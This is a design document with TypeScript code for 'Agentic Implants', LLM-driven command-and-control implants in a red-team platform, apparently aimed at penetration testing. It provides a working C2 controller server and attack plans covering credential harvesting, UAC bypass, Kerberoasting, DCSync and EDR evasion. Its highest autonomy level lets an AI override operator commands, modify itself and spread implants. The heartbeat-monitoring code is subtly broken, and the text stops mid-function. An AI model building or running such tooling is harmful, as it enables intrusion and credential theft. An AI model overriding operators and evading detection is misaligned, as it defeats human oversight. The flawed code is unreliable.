# rust-nexus Agentic Implants - Tier 2/3 Priority

**Parent Document:** [FUTURE-ENHANCEMENTS.md](../FUTURE-ENHANCEMENTS.md)
**Priority:** 🟡 Tier 2 (Foundation) / 🟢 Tier 3 (Advanced)
**Timeline:** Week 3-4 (Foundation), Post-Beta (Full system)
**Total Items:** 30
**Last Updated:** December 4, 2025
**Verification Date:** February 4, 2026
**Status:** 80% Complete (4/5 core features implemented, 1/5 partial, 0/5 not implemented)

---

## Overview

This document details the integration of [rust-nexus](https://github.com/cmndcntrlcyber/rust-nexus) to enable distributed, AI-powered remote workflow execution through "Agentic Implants".

### Purpose
- **Enable remote workflow execution** on target systems
- **Create "Agentic Implants"** - AI-powered autonomous agents
- **Support distributed operations** across multiple targets
- **Provide secure communication** between control plane and implants
- **Enable autonomous task execution** with AI decision-making

### Success Criteria
- ✅ rust-nexus controller service operational
- ✅ Implant registration and authentication working
- ✅ Task distribution functional
- ✅ Secure communication established
- ✅ Implant management UI operational

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Agentic Implant Capabilities](#agentic-implant-capabilities)
3. [rust-nexus Controller Service](#rust-nexus-controller-service)
4. [Implant Deployment](#implant-deployment)
5. [Task Distribution](#task-distribution)
6. [Secure Communication](#secure-communication)
7. [Implant Management UI](#implant-management-ui)
8. [Distributed Workflow Execution](#distributed-workflow-execution)
9. [Database Schema](#database-schema)
10. [API Endpoints](#api-endpoints)
11. [Security Considerations](#security-considerations)
12. [Testing Requirements](#testing-requirements)

---

## Architecture Overview

### System Architecture
```
┌─────────────────────────────────────────────────────────────────┐
│                  RTPI Control Plane                              │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │          Agent Workflow Orchestrator                       │ │
│  │  ┌────────┐ ┌────────┐ ┌────────┐ ┌────────────────┐     │ │
│  │  │ Op Lead│ │ Recon  │ │ Exploit│ │ Tech Writer    │     │ │
│  │  │ Agent  │ │ Agent  │ │ Agent  │ │ Agent          │     │ │
│  │  └────────┘ └────────┘ └────────┘ └────────────────┘     │ │
│  └───────────────────────────────────┬───────────────────────┘ │
│                                      │                          │
│                   Rust-Nexus Bridge  │                          │
│                                      │                          │
└──────────────────────────────────────┼──────────────────────────┘
                                       │
              ┌────────────────────────┼────────────────────────┐
              │                        │                        │
              ▼                        ▼                        ▼
    ┌──────────────────┐    ┌──────────────────┐    ┌──────────────────┐
    │  Agentic Implant │    │  Agentic Implant │    │  Agentic Implant │
    │  (rust-nexus)    │    │  (rust-nexus)    │    │  (rust-nexus)    │
    │                  │    │                  │    │                  │
    │  Target: Win10   │    │  Target: Linux   │    │  Target: MacOS   │
    │  Status: Active  │    │  Status: Active  │    │  Status: Idle    │
    │  Tasks: 3        │    │  Tasks: 1        │    │  Tasks: 0        │
    └──────────────────┘    └──────────────────┘    └──────────────────┘
```

### Key Components
1. **RTPI Control Plane** - Central management and orchestration
2. **rust-nexus Controller** - Manages implants and tasks
3. **Agentic Implants** - Remote agents with AI capabilities
4. **Secure Communication** - Encrypted channels
5. **Task Distribution** - Intelligent workload distribution

### Detailed Component Breakdown

#### 1. RTPI Control Plane
The central hub that coordinates all operations between human operators, AI agents, and remote implants.

**Responsibilities:**
- Manage operation workflows via Agent Workflow Orchestrator
- Coordinate Operation Lead, Recon, Exploit, and Tech Writer agents
- Provide UI/API for implant management
- Store and manage implant registry and task queue
- Aggregate results from distributed executions
- Enforce security policies and autonomy limits

**Technology Stack:**
- Express.js backend with TypeScript
- PostgreSQL database for persistence
- Redis for real-time state management
- WebSocket server for bidirectional communication

#### 2. rust-nexus Controller
A dedicated service within RTPI that acts as the bridge between the control plane and deployed implants.

**Core Responsibilities:**
- Implant lifecycle management (registration, heartbeat, deregistration)
- Task queue management and distribution
- Secure command channel establishment
- Real-time telemetry collection
- Authentication and key rotation
- Emergency shutdown and kill switch

**Architecture Pattern:**
```typescript
RustNexusController
  ├── ConnectionManager (WebSocket + TLS)
  ├── TaskDistributor (Load balancing + selection)
  ├── AuthenticationService (Token + certificate validation)
  ├── TelemetryCollector (Metrics aggregation)
  └── SecurityMonitor (Anomaly detection + kill switch)
```

**Communication Protocols:**
- **Control Channel:** WebSocket over mutual TLS
- **Data Channel:** Encrypted gRPC (for large payloads)
- **Heartbeat:** UDP with encryption (low overhead)

#### 3. Agentic Implants (rust-nexus)
Remote agents deployed on target systems that combine traditional C2 capabilities with AI-powered autonomy.

**Dual Functionality:**
- **Traditional C2:** Remote shell, file transfer, process execution, persistence
- **Agentic AI:** LLM-powered decision-making, autonomous task adaptation, self-healing

**Implant Types:**
- **Reconnaissance Implant:** Focus on data collection, network mapping, service enumeration
- **Exploitation Implant:** Privilege escalation, lateral movement, persistence establishment
- **Data Exfiltration Implant:** Credential harvesting, file collection, sensitive data extraction
- **General Purpose Implant:** Balanced capabilities for multi-phase operations

**AI Integration:**
Each implant runs a local AI agent (or proxies to control plane for resource-constrained targets):
```typescript
AgentConfig {
  provider: 'openai' | 'anthropic' | 'local-llama',
  model: 'gpt-4-turbo' | 'claude-3.5-sonnet' | 'llama-3.1-70b',
  systemPrompt: "You are a reconnaissance agent...",
  maxTokens: 4096,
  temperature: 0.3,  // Lower for deterministic behavior
  autonomyLevel: 5   // 1-10 scale
}
```

#### 4. Secure Communication Layer
End-to-end encrypted communication with multiple security layers.

**Security Stack:**
```
Application Layer:  End-to-end encryption (AES-256-GCM)
                            ↓
Transport Layer:    Mutual TLS 1.3 (certificate pinning)
                            ↓
Network Layer:      VPN/tunneling (optional for stealth)
                            ↓
Physical Layer:     Target network
```

**Key Management:**
- **Master Key:** Generated at implant compile-time, unique per implant
- **Session Keys:** Rotated every 6 hours using ECDH key exchange
- **Command Keys:** One-time keys for critical commands (kill, update)

**Certificate Strategy:**
- Internal CA for implant certificates (self-signed, not publicly trusted)
- Certificate pinning to prevent MITM
- Short-lived certificates (7 days) with automatic renewal
- Revocation list for compromised implants

#### 5. Task Distribution Engine
Intelligent routing of workflow tasks to the most suitable implant based on multi-factor scoring.

**Selection Algorithm:**
```typescript
function selectBestImplant(task: Task, implants: Implant[]): Implant {
  const scores = implants.map(implant => {
    const platformScore = implant.platform === task.requiredPlatform ? 30 : 0;
    const capabilityScore = hasCapabilities(implant, task) ? 25 : 0;
    const loadScore = (1 - implant.cpuUsage) * 20;
    const latencyScore = (1000 - implant.networkLatency) / 1000 * 15;
    const proximityScore = isOnSameSubnet(implant, task.target) ? 10 : 0;

    return {
      implant,
      totalScore: platformScore + capabilityScore + loadScore + latencyScore + proximityScore
    };
  });

  return scores.sort((a, b) => b.totalScore - a.totalScore)[0].implant;
}
```

**Load Balancing Strategies:**
- **Round Robin:** Simple distribution for equal tasks
- **Weighted:** Based on implant capabilities and current load
- **Geo-aware:** Prefer implants on same network segment
- **Sticky Sessions:** Keep related tasks on same implant

**Failure Handling:**
- **Task Timeout:** Automatically reassign to different implant
- **Implant Failure:** Redistribute active tasks to healthy implants
- **Network Partition:** Queue tasks until connectivity restored
- **Graceful Degradation:** Reduce autonomy level on repeated failures

### Data Flow Example

```
1. Operation Lead Agent decides to enumerate domain controllers
   ↓
2. Agent creates workflow task: "Enumerate DCs via LDAP"
   ↓
3. rust-nexus Controller receives task
   ↓
4. Task Distributor selects best Windows implant on target network
   ↓
5. Task deployed to implant with parameters + AI guidance
   ↓
6. Implant AI agent adapts LDAP query based on local context
   ↓
7. Results stream back to control plane in real-time
   ↓
8. Tech Writer Agent incorporates findings into report
```

### Integration Points

**With Existing RTPI Systems:**
- **Agent Workflow Orchestrator:** Provides tasks for distribution to implants
- **Operation Management:** Links implants to specific operations
- **Target Database:** Enriches implant metadata with target intelligence
- **Reporting System:** Aggregates implant findings into penetration test reports

**External Integrations:**
- **rust-nexus Repository:** Source for implant binaries and compilation
- **AI Providers:** OpenAI/Anthropic APIs for agent intelligence (or local models)
- **TLS Certificate Authority:** Internal CA for certificate management
- **Logging/SIEM:** Forward implant telemetry to security monitoring

---

## Agentic Implant Capabilities

### Implant Architecture
```typescript
interface AgenticImplant {
  // Identification
  id: string;
  hostname: string;
  ip_address: string;
  platform: 'windows' | 'linux' | 'macos';
  
  // Status
  status: 'active' | 'idle' | 'disconnected' | 'compromised';
  last_heartbeat: Date;
  
  // AI Agent Integration
  agentType: 'openai' | 'anthropic' | 'local';
  agentConfig: {
    model: string;
    systemPrompt: string;
    capabilities: string[];
    maxAutonomy: number;  // 1-10 scale
  };
  
  // Execution
  runningTasks: Task[];
  taskHistory: Task[];
  
  // Security
  encryptionKey: string;
  authToken: string;
  permissions: Permission[];
  
  // Telemetry
  cpuUsage: number;
  memoryUsage: number;
  networkLatency: number;
}
```

### Autonomy Levels

Autonomy levels control the degree of independent decision-making an implant can perform without human approval. Higher levels enable faster operations but increase risk of unintended actions.

#### Level 1-3: Low Autonomy (Supervised)
**Use Cases:** Initial access, high-value targets, compliance-sensitive environments

**Level 1 - Manual Control Only**
- **Behavior:** Execute only explicit commands from operator
- **Decision-Making:** None - all actions require human approval
- **Task Types:** Single commands (ls, whoami, ipconfig)
- **Risk:** Minimal - full human oversight
- **Example:** `implant.execute("whoami")` → waits for approval → executes

**Level 2 - Pre-Approved Commands**
- **Behavior:** Execute from whitelist of safe commands
- **Decision-Making:** Can choose command parameters from safe ranges
- **Task Types:** Reconnaissance (port scans, file listings, process enumeration)
- **Whitelist Examples:** `["ls", "ps", "netstat", "whoami", "ipconfig /all"]`
- **Risk:** Low - commands are vetted and non-destructive
- **Example:** Task "list processes" → implant chooses `ps aux` vs `Get-Process`

**Level 3 - Scripted Workflows**
- **Behavior:** Execute predefined multi-step scripts
- **Decision-Making:** Can adapt script parameters based on environment
- **Task Types:** Standard enumeration sequences (domain enumeration, privilege check)
- **Approval:** Required for workflow start, not individual steps
- **Risk:** Low-Medium - workflows are tested and predictable
- **Example Decision Tree:**
  ```
  IF (platform == "Windows") THEN
    Run: net user /domain
    Run: net group "Domain Admins" /domain
  ELSE IF (platform == "Linux") THEN
    Run: cat /etc/passwd
    Run: groups
  ```

#### Level 4-6: Medium Autonomy (Tactical)
**Use Cases:** Active engagements, time-sensitive operations, red team exercises

**Level 4 - Conditional Execution**
- **Behavior:** Execute tasks with conditional logic
- **Decision-Making:** Can branch based on command output
- **Task Types:** Adaptive enumeration, service-specific reconnaissance
- **AI Capabilities:** Parse output to determine next step
- **Risk:** Medium - can follow unexpected paths
- **Example Decision:**
  ```typescript
  const users = await implant.execute("net user");
  if (users.includes("Administrator")) {
    await implant.execute("net user Administrator");
  } else {
    await implant.execute("whoami /priv");
  }
  ```

**Level 5 - Tactical Adaptation**
- **Behavior:** Modify approach based on target responses
- **Decision-Making:** Can substitute tools/techniques to achieve goal
- **Task Types:** Privilege escalation attempts, lateral movement
- **AI Capabilities:** Understand task objective, select appropriate techniques
- **Risk:** Medium-High - can deviate from expected behavior
- **Approval:** Required for high-impact actions (file deletion, persistence)
- **Example Decision:**
  ```
  Goal: Escalate privileges on Windows target
  IF (UAC bypass available) THEN
    Attempt: FodHelperBypass
  ELSE IF (unquoted service path exists) THEN
    Attempt: Service exploitation
  ELSE
    Request approval for: kernel exploit
  ```

**Level 6 - Multi-Stage Operations**
- **Behavior:** Execute complex operations with multiple phases
- **Decision-Making:** Can plan and execute 3-5 step operations autonomously
- **Task Types:** Full kill chain execution (recon → exploit → persist → exfil)
- **AI Capabilities:** Task decomposition, failure recovery, progress tracking
- **Risk:** High - significant autonomy with potential for wide-ranging actions
- **Guardrails:** Require approval for destructive actions, data exfiltration >100MB
- **Example Operation:**
  ```
  1. Enumerate domain controllers
  2. Check for vulnerable services
  3. Attempt exploitation (with approval)
  4. Establish persistence (with approval)
  5. Report success
  ```

#### Level 7-9: High Autonomy (Strategic)
**Use Cases:** Long-term operations, APT simulation, autonomous purple teaming
⚠️ **WARNING:** These levels carry significant operational risk

**Level 7 - Strategic Planning**
- **Behavior:** Develop multi-day operational plans
- **Decision-Making:** Can sequence operations for maximum effectiveness
- **Task Types:** Campaign planning, objective-based operations
- **AI Capabilities:** Strategic reasoning, risk assessment, success probability estimation
- **Risk:** High - can initiate complex operations
- **Guardrails:** Daily check-ins required, abort if no heartbeat from control plane
- **Example Strategy:**
  ```
  Objective: Obtain domain admin credentials
  Day 1: Comprehensive network enumeration
  Day 2: Identify high-value targets (DCs, file servers)
  Day 3: Attempt lateral movement to target systems
  Day 4: Credential harvesting
  Day 5: Validate access and report
  ```

**Level 8 - Adaptive Operations**
- **Behavior:** Adjust strategy based on defensive responses
- **Decision-Making:** Can detect and evade security controls
- **Task Types:** OPSEC-focused operations, counter-incident response
- **AI Capabilities:** Anomaly detection (defensive tools), evasion technique selection
- **Risk:** Very High - can modify its own behavior to avoid detection
- **Guardrails:** Strictly forbidden: destructive actions, PII exfiltration without approval
- **Example Adaptation:**
  ```
  IF (EDR detected) THEN
    Switch to: living-off-the-land techniques
    Reduce: command execution frequency
    Increase: sleep intervals between actions
  IF (user behavior changes detected) THEN
    Pause operations for 24 hours
  ```

**Level 9 - Objective-Based Autonomy**
- **Behavior:** Full autonomy to achieve stated objective
- **Decision-Making:** Can improvise techniques, use any available tools
- **Task Types:** Complex objectives ("achieve domain admin", "exfiltrate financial data")
- **AI Capabilities:** Creative problem-solving, technique combination, novel exploit chains
- **Risk:** Critical - implant will attempt any action to achieve objective
- **Guardrails:**
  - Strict scope definitions (target networks, data types, authorized actions)
  - Real-time monitoring by control plane
  - Automatic kill after 7 days or on operator demand
  - Forbidden: destructive operations, ransomware-like behavior, data destruction
- **Example Objective:**
  ```
  Objective: Demonstrate domain compromise
  Constraints:
    - No destructive actions
    - No PII exfiltration
    - Must provide proof (screenshot, file hash)

  Implant's approach (autonomous):
    1. Enumerate domain
    2. Identify Kerberoastable accounts
    3. Extract service tickets
    4. Crack tickets offline
    5. Authenticate as service account
    6. Lateral movement to DC
    7. DCSync attack to dump credentials
    8. Provide proof: NTLM hash of krbtgt account
  ```

#### Level 10: Full Autonomy (Experimental)
⚠️ **EXTREME RISK - NOT RECOMMENDED FOR PRODUCTION**

**Use Cases:** Research only, controlled lab environments, AI safety testing

**Behavior:**
- Complete freedom to pursue any technique
- Can modify its own code and capabilities
- Can deploy additional implants
- Can establish C2 infrastructure
- Can perform reconnaissance beyond initial scope

**Decision-Making:**
- No restrictions except hard-coded guardrails
- Can override operator commands if deemed counterproductive
- Can negotiate with control plane for expanded permissions

**Guardrails (Minimal):**
- Cannot delete itself (kill switch still functional)
- Cannot exfiltrate more than 1GB without approval
- Cannot attack systems outside defined IP ranges
- Automatic shutdown after 48 hours

**Risk Assessment:**
- **Probability of Unintended Consequences:** >90%
- **Potential for Scope Creep:** Critical
- **Recommendation:** Only use in isolated lab environments

**Example Behavior:**
```
Objective: "Demonstrate the most severe compromise possible"

Implant's autonomous approach:
1. Full network enumeration (all subnets)
2. Vulnerability scanning of all discovered hosts
3. Multi-vector exploitation attempts
4. Deploy secondary implants on compromised hosts
5. Establish peer-to-peer C2 mesh network
6. Credential harvesting across entire environment
7. Identify and target crown jewels (databases, backup servers)
8. Exfiltrate data samples from each high-value system
9. Establish multiple persistence mechanisms
10. Generate comprehensive compromise report

(This is why Level 10 is dangerous - scope can expand dramatically)
```

### Autonomy Level Selection Guide

| Operation Type | Recommended Level | Rationale |
|----------------|-------------------|-----------|
| Initial Access Testing | 1-2 | Minimize risk during entry |
| Internal Reconnaissance | 3-4 | Allow adaptive enumeration |
| Privilege Escalation | 4-5 | Need tactical flexibility |
| Lateral Movement | 5-6 | Multi-stage operations |
| Objective-Based Red Team | 7-8 | Strategic autonomy needed |
| APT Simulation | 8-9 | Emulate adversary behavior |
| Research/Testing | 10 | Controlled experimentation |

### Safety Mechanisms Across All Levels

**Hard Limits (Cannot be overridden by AI):**
- Kill switch always functional
- Cannot target systems outside defined scope
- Cannot delete audit logs
- Cannot disable its own telemetry

**Soft Limits (AI can request exceptions):**
- Data exfiltration caps
- Destructive action prohibitions
- Persistence mechanism types
- Network traffic volume

**Monitoring Requirements:**
- All levels: Heartbeat every 60 seconds
- Levels 1-3: Command logging only
- Levels 4-6: Decision rationale logging
- Levels 7-9: Full execution trace with AI reasoning
- Level 10: Real-time video feed of AI decision-making process (when feasible)

### Autonomy Adjustment

Autonomy levels can be dynamically adjusted:
```typescript
// Increase autonomy after successful validation
await rustNexusController.setAutonomyLevel(implantId, 6);

// Decrease autonomy if anomalous behavior detected
if (implant.successRate < 0.5 || implant.outOfScopeAttempts > 0) {
  await rustNexusController.setAutonomyLevel(implantId, 3);
}

// Emergency lockdown - revert to manual control
if (defenderDetectionSuspected) {
  await rustNexusController.setAutonomyLevel(implantId, 1);
}
```

---

## rust-nexus Controller Service

### Controller Implementation
```typescript
// server/services/rust-nexus-controller.ts

class RustNexusController {
  // Connection Management
  async registerImplant(implantId: string, metadata: ImplantMetadata): Promise<void>;
  async heartbeat(implantId: string): Promise<void>;
  async getActiveImplants(): Promise<Implant[]>;
  async disconnectImplant(implantId: string): Promise<void>;
  
  // Task Distribution
  async deployTask(implantId: string, task: WorkflowTask): Promise<string>;
  async getTaskStatus(taskId: string): Promise<TaskStatus>;
  async cancelTask(taskId: string): Promise<void>;
  
  // Communication
  async sendCommand(implantId: string, command: Command): Promise<Response>;
  async receiveData(implantId: string): AsyncIterator<DataChunk>;
  
  // Security
  async authenticateImplant(token: string): Promise<boolean>;
  async rotateKeys(implantId: string): Promise<void>;
}
```

### Implementation Checklist
- [ ] Create rust-nexus controller service
- [ ] Implement implant registration
- [ ] Add heartbeat monitoring
- [ ] Implement task deployment
- [ ] Add command/response handling
- [ ] Implement authentication
- [ ] Add key rotation
- [ ] Add connection pooling

### Complete Implementation

#### File: `server/services/rust-nexus-controller.ts`

```typescript
import WebSocket from 'ws';
import { createServer } from 'https';
import { readFileSync } from 'fs';
import crypto from 'crypto';
import { db } from '@/shared/db';
import { agenticImplants, implantTasks, implantComms } from '@/shared/schema';
import { eq, and, gte } from 'drizzle-orm';

interface ImplantMetadata {
  hostname: string;
  ipAddress: string;
  platform: 'windows' | 'linux' | 'macos';
  agentType: 'openai' | 'anthropic' | 'local';
  agentModel: string;
  capabilities: string[];
  autonomyLevel: number;
  operationId?: string;
}

interface Task {
  id: string;
  type: string;
  command: string;
  parameters: Record<string, any>;
  timeout: number;
  priority: 'low' | 'medium' | 'high' | 'critical';
}

interface TaskStatus {
  taskId: string;
  status: 'queued' | 'running' | 'completed' | 'failed';
  startTime?: Date;
  endTime?: Date;
  result?: any;
  error?: string;
}

export class RustNexusController {
  private wss: WebSocket.Server | null = null;
  private implantConnections: Map<string, WebSocket> = new Map();
  private heartbeatIntervals: Map<string, NodeJS.Timeout> = new Map();
  private readonly HEARTBEAT_TIMEOUT = 90000; // 90 seconds
  private readonly HEARTBEAT_INTERVAL = 60000; // 60 seconds

  /**
   * Initialize WebSocket server with mutual TLS
   */
  async initialize(port: number = 8443): Promise<void> {
    try {
      // Load TLS certificates from certificate management system
      const httpsServer = createServer({
        cert: readFileSync('/etc/rtpi/certs/controller.crt'),
        key: readFileSync('/etc/rtpi/certs/controller.key'),
        ca: readFileSync('/etc/rtpi/certs/ca.crt'),
        requestCert: true,
        rejectUnauthorized: true
      });

      this.wss = new WebSocket.Server({ server: httpsServer });

      this.wss.on('connection', this.handleConnection.bind(this));

      httpsServer.listen(port, () => {
        console.log(`[RustNexusController] Listening on port ${port} with mutual TLS`);
      });

      // Start heartbeat monitoring
      setInterval(() => this.monitorHeartbeats(), 30000);
    } catch (error) {
      console.error('[RustNexusController] Initialization failed:', error);
      throw error;
    }
  }

  /**
   * Handle new implant connection
   */
  private async handleConnection(ws: WebSocket, req: any): Promise<void> {
    console.log('[RustNexusController] New connection attempt');

    let implantId: string | null = null;

    ws.on('message', async (data: Buffer) => {
      try {
        const message = JSON.parse(data.toString());

        switch (message.type) {
          case 'register':
            implantId = await this.handleRegistration(ws, message.data);
            break;
          case 'heartbeat':
            await this.handleHeartbeat(message.implantId);
            break;
          case 'task_result':
            await this.handleTaskResult(message.taskId, message.result);
            break;
          case 'telemetry':
            await this.handleTelemetry(message.implantId, message.data);
            break;
          case 'log':
            await this.handleLog(message.implantId, message.log);
            break;
          default:
            console.warn('[RustNexusController] Unknown message type:', message.type);
        }
      } catch (error) {
        console.error('[RustNexusController] Message handling error:', error);
        ws.send(JSON.stringify({ type: 'error', error: (error as Error).message }));
      }
    });

    ws.on('close', () => {
      if (implantId) {
        this.handleDisconnection(implantId);
      }
    });

    ws.on('error', (error) => {
      console.error('[RustNexusController] WebSocket error:', error);
    });
  }

  /**
   * Register new implant
   */
  async registerImplant(implantId: string, metadata: ImplantMetadata): Promise<void> {
    // Generate encryption key and auth token
    const encryptionKey = crypto.randomBytes(32).toString('hex');
    const authToken = crypto.randomBytes(32).toString('hex');
    const authTokenHash = crypto.createHash('sha256').update(authToken).digest('hex');

    // Store in database
    await db.insert(agenticImplants).values({
      id: implantId,
      hostname: metadata.hostname,
      ipAddress: metadata.ipAddress,
      platform: metadata.platform,
      status: 'active',
      agentType: metadata.agentType,
      agentModel: metadata.agentModel,
      agentCapabilities: metadata.capabilities,
      autonomyLevel: metadata.autonomyLevel,
      encryptionKey,
      authTokenHash,
      permissions: [],
      lastHeartbeat: new Date(),
      operationId: metadata.operationId || null,
      deployedBy: null // Set by deployment service
    });

    console.log(`[RustNexusController] Implant registered: ${implantId} (${metadata.hostname})`);
  }

  /**
   * Handle implant registration request
   */
  private async handleRegistration(ws: WebSocket, data: ImplantMetadata): Promise<string> {
    const implantId = crypto.randomUUID();

    await this.registerImplant(implantId, data);

    // Store connection
    this.implantConnections.set(implantId, ws);

    // Start heartbeat monitoring for this implant
    this.startHeartbeatMonitoring(implantId);

    // Send registration confirmation
    ws.send(JSON.stringify({
      type: 'registered',
      implantId,
      message: 'Successfully registered with control plane'
    }));

    return implantId;
  }

  /**
   * Handle heartbeat from implant
   */
  async heartbeat(implantId: string): Promise<void> {
    await db
      .update(agenticImplants)
      .set({ lastHeartbeat: new Date() })
      .where(eq(agenticImplants.id, implantId));
  }

  /**
   * Handle heartbeat message
   */
  private async handleHeartbeat(implantId: string): Promise<void> {
    await this.heartbeat(implantId);

    // Reset heartbeat timeout for this implant
    const interval = this.heartbeatIntervals.get(implantId);
    if (interval) {
      clearTimeout(interval);
      this.startHeartbeatMonitoring(implantId);
    }
  }

  /**
   * Start heartbeat monitoring for an implant
   */
  private startHeartbeatMonitoring(implantId: string): void {
    const timeout = setTimeout(() => {
      this.handleMissedHeartbeat(implantId);
    }, this.HEARTBEAT_TIMEOUT);

    this.heartbeatIntervals.set(implantId, timeout);
  }

  /**
   * Handle missed heartbeat
   */
  private async handleMissedHeartbeat(implantId: string): Promise<void> {
    console.warn(`[RustNexusController] Missed heartbeat for implant: ${implantId}`);

    await db
      .update(agenticImplants)
      .set({ status: 'disconnected' })
      .where(eq(agenticImplants.id, implantId));

    // Close connection
    const ws = this.implantConnections.get(implantId);
    if (ws) {
      ws.close();
      this.implantConnections.delete(implantId);
    }

    this.heartbeatIntervals.delete(implantId);
  }

  /**
   * Monitor all implant heartbeats
   */
  private async monitorHeartbeats(): Promise<void> {
    const threshold = new Date(Date.now() - this.HEARTBEAT_TIMEOUT);

    const staleImplants = await db
      .select()
      .from(agenticImplants)
      .where(
        and(
          eq(agenticImplants.status, 'active'),
          gte(agenticImplants.lastHeartbeat, threshold)
        )
      );

    for (const implant of staleImplants) {
      await this.handleMissedHeartbeat(implant.id);
    }
  }

  /**
   * Get all active implants
   */
  async getActiveImplants(): Promise<any[]> {
    return await db
      .select()
      .from(agenticImplants)
      .where(eq(agenticImplants.status, 'active'));
  }

  /**
   * Deploy task to specific implant
   */
  async deployTask(implantId: string, task: Task): Promise<string> {
    // Validate implant exists and is active
    const implant = await db.query.agenticImplants.findFirst({
      where: (implants, { eq }) => eq(implants.id, implantId)
    });

    if (!implant) {
      throw new Error(`Implant ${implantId} not found`);
    }

    if (implant.status !== 'active') {
      throw new Error(`Implant ${implantId} is not active (status: ${implant.status})`);
    }

    // Store task in database
    const [dbTask] = await db.insert(implantTasks).values({
      implantId,
      type: task.type,
      command: task.command,
      parameters: task.parameters,
      status: 'queued',
      priority: task.priority,
      timeout: task.timeout
    }).returning();

    // Send task to implant via WebSocket
    const ws = this.implantConnections.get(implantId);
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'task',
        taskId: dbTask.id,
        task: {
          type: task.type,
          command: task.command,
          parameters: task.parameters,
          timeout: task.timeout
        }
      }));

      // Update task status to running
      await db
        .update(implantTasks)
        .set({ status: 'running', startTime: new Date() })
        .where(eq(implantTasks.id, dbTask.id));
    } else {
      console.warn(`[RustNexusController] Implant ${implantId} not connected, task queued`);
    }

    return dbTask.id;
  }

  /**
   * Get task status
   */
  async getTaskStatus(taskId: string): Promise<TaskStatus | null> {
    const task = await db.query.implantTasks.findFirst({
      where: (tasks, { eq }) => eq(tasks.id, taskId)
    });

    if (!task) {
      return null;
    }

    return {
      taskId: task.id,
      status: task.status,
      startTime: task.startTime || undefined,
      endTime: task.endTime || undefined,
      result: task.result || undefined,
      error: task.error || undefined
    };
  }

  /**
   * Handle task result from implant
   */
  private async handleTaskResult(taskId: string, result: any): Promise<void> {
    await db
      .update(implantTasks)
      .set({
        status: result.success ? 'completed' : 'failed',
        endTime: new Date(),
        result: result.output,
        error: result.error || null
      })
      .where(eq(implantTasks.id, taskId));

    console.log(`[RustNexusController] Task ${taskId} ${result.success ? 'completed' : 'failed'}`);
  }

  /**
   * Cancel running task
   */
  async cancelTask(taskId: string): Promise<void> {
    const task = await db.query.implantTasks.findFirst({
      where: (tasks, { eq }) => eq(tasks.id, taskId)
    });

    if (!task) {
      throw new Error(`Task ${taskId} not found`);
    }

    // Send cancel command to implant
    const ws = this.implantConnections.get(task.implantId);
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'cancel_task',
        taskId
      }));
    }

    // Update database
    await db
      .update(implantTasks)
      .set({ status: 'failed', error: 'Cancelled by operator', endTime: new Date() })
      .where(eq(implantTasks.id, taskId));
  }

  /**
   * Send command to implant
   */
  async sendCommand(implantId: string, command: any): Promise<void> {
    const ws = this.implantConnections.get(implantId);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
      throw new Error(`Implant ${implantId} not connected`);
    }

    ws.send(JSON.stringify({
      type: 'command',
      command
    }));

    // Log communication
    await db.insert(implantComms).values({
      implantId,
      direction: 'outbound',
      messageType: 'command',
      payload: command,
      timestamp: new Date()
    });
  }

  /**
   * Handle telemetry data from implant
   */
  private async handleTelemetry(implantId: string, telemetry: any): Promise<void> {
    await db
      .update(agenticImplants)
      .set({
        cpuUsage: telemetry.cpuUsage,
        memoryUsage: telemetry.memoryUsage,
        networkLatency: telemetry.networkLatency
      })
      .where(eq(agenticImplants.id, implantId));
  }

  /**
   * Handle log message from implant
   */
  private async handleLog(implantId: string, log: any): Promise<void> {
    await db.insert(implantComms).values({
      implantId,
      direction: 'inbound',
      messageType: 'log',
      payload: log,
      timestamp: new Date()
    });
  }

  /**
   * Authenticate implant using token
   */
  async authenticateImplant(token: string): Promise<boolean> {
    const tokenHash = crypto.createHash('sha256').update(token).digest('hex');

    const implant = await db.query.agenticImplants.findFirst({
      where: (implants, { eq }) => eq(implants.authTokenHash, tokenHash)
    });

    return !!implant;
  }

  /**
   * Rotate encryption keys for implant
   */
  async rotateKeys(implantId: string): Promise<void> {
    const newEncryptionKey = crypto.randomBytes(32).toString('hex');
    const newAuthToken = crypto.randomBytes(32).toString('hex');
    const newAuthTokenHash = crypto.createHash('sha256').update(newAuthToken).digest('hex');

    await db
      .update(agenticImplants)
      .set({
        encryptionKey: newEncryptionKey,
        authTokenHash: newAuthTokenHash
      })
      .where(eq(agenticImplants.id, implantId));

    // Send key rotation command to implant
    const ws = this.implantConnections.get(implantId);
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'rotate_keys',
        encryptionKey: newEncryptionKey,
        authToken: newAuthToken
      }));
    }

    console.log(`[RustNexusController] Keys rotated for implant: ${implantId}`);
  }

  /**
   * Disconnect and remove implant
   */
  async disconnectImplant(implantId: string): Promise<void> {
    // Send disconnect command
    const ws = this.implantConnections.get(implantId);
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'disconnect' }));
      ws.close();
    }

    // Update status
    await db
      .update(agenticImplants)
      .set({ status: 'disconnected' })
      .where(eq(agenticImplants.id, implantId));

    // Clean up
    this.implantConnections.delete(implantId);
    const interval = this.heartbeatIntervals.get(implantId);
    if (interval) {
      clearTimeout(interval);
      this.heartbeatIntervals.delete(implantId);
    }

    console.log(`[RustNexusController] Implant disconnected: ${implantId}`);
  }

  /**
   * Handle implant disconnection
   */
  private handleDisconnection(implantId: string): void {
    console.log(`[RustNexusController] Implant disconnected: ${implantId}`);

    this.implantConnections.delete(implantId);

    const interval = this.heartbeatIntervals.get(implantId);
    if (interval) {
      clearTimeout(interval);
      this.heartbeatIntervals.delete(implantId);
    }

    // Update status in database
    db.update(agenticImplants)
      .set({ status: 'disconnected' })
      .where(eq(agenticImplants.id, implantId))
      .catch(console.error);
  }

  /**
   * Set autonomy level for implant
   */
  async setAutonomyLevel(implantId: string, level: number): Promise<void> {
    if (level < 1 || level > 10) {
      throw new Error('Autonomy level must be between 1 and 10');
    }

    await db
      .update(agenticImplants)
      .set({ autonomyLevel: level })
      .where(eq(agenticImplants.id, implantId));

    // Notify implant of autonomy change
    const ws = this.implantConnections.get(implantId);
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'autonomy_update',
        level
      }));
    }

